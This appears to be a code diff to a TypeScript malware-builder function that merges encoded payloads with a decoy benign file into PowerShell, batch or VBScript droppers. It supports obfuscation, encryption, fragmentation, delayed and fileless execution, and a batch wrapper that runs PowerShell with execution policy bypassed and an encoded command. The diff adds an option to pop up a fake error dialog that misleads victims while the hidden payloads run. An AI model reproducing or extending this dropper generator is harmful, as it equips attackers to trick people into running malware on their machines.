@@ -17,6 +17,7 @@ const MergePayloadsInputSchema = z.object({
   useFragmentation: z.boolean().optional(),
   executionDelay: z.string().optional(),
   fileless: z.boolean().optional(),
+  fakeErrorMessage: z.string().optional(),
 });
 
 type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;
@@ -53,12 +54,21 @@ const generatePowershellDropper = (
     encryptionKey?: string, 
     useFragmentation?: boolean,
     executionDelay?: string,
-    fileless?: boolean
+    fileless?: boolean,
+    fakeErrorMessage?: string
 ): string => {
     
     let delaySection = '';
     if (executionDelay && !isNaN(parseInt(executionDelay, 10))) {
         delaySection = `Start-Sleep -Seconds ${parseInt(executionDelay, 10)}`;
+    }
+
+    let fakeErrorSection = '';
+    if (fakeErrorMessage) {
+        fakeErrorSection = `
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.MessageBox]::Show("${fakeErrorMessage}", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+        `;
     }
 
     const payloadProcessingLoops = payloads.map((payload, index) => {
@@ -143,6 +153,8 @@ ${benignBase64}
     [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
     Start-Process $benignFilePath
 
+    ${fakeErrorSection}
+
     ${delaySection}
 
     ${payloadProcessingLoops}
@@ -160,7 +172,7 @@ ${benignBase64}
 export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
   try {
     const validatedInput = MergePayloadsInputSchema.parse(input);
-    const { payloads, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless } = validatedInput;
+    const { payloads, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage } = validatedInput;
 
     const processedPayloads = payloads.map(payload => {
         let payloadBase64 = decodeDataUri(payload.content);
@@ -182,11 +194,11 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
 
     switch (outputFormat) {
         case 'ps1':
-            scriptContent = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
+            scriptContent = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage);
             break;
         
         case 'bat':
-            const psScript = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
+            const psScript = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage);
             const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
             scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
             break;
@@ -258,6 +270,8 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 benignB64 = "${benignBase64}"
                 Call Base64ToFile(benignB64, benignFilePath)
                 objShell.Run "cmd /c """ & benignFilePath & """", 0, True
+
+                ${fakeErrorMessage ? `MsgBox "${fakeErrorMessage}", 16, "Error"` : ''}
 
                 ${executionDelay ? `WScript.Sleep ${parseInt(executionDelay, 10) * 1000}` : ''}
                 
